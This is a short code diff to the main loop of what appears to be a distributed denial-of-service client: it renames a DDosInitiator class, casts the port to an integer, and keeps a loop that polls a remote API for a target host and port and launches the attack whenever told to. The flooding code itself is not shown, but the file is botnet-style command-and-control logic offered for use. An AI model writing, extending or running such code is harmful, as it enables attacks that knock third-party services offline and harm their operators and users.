@@ -1,11 +1,11 @@
 import time
 from client.api import API
-from client.dos import DDosInitiator
+from client.dos import DoSInitiator
 
 
 # Get API data and start DDoS locally
 def main():
-    di = DDosInitiator()
+    di = DoSInitiator()
     while True:
         api = API()
         data = api.get_data()
@@ -14,8 +14,9 @@ def main():
             di.work = False
             time.sleep(5)
             continue
-        di.work = True
-        di.start(target_host=data["host"], target_port=data["port"])
+        else:
+            di.work = True
+            di.start(target_host=data["host"], target_port=int(data["port"]))
 
 
 if __name__ == '__main__':
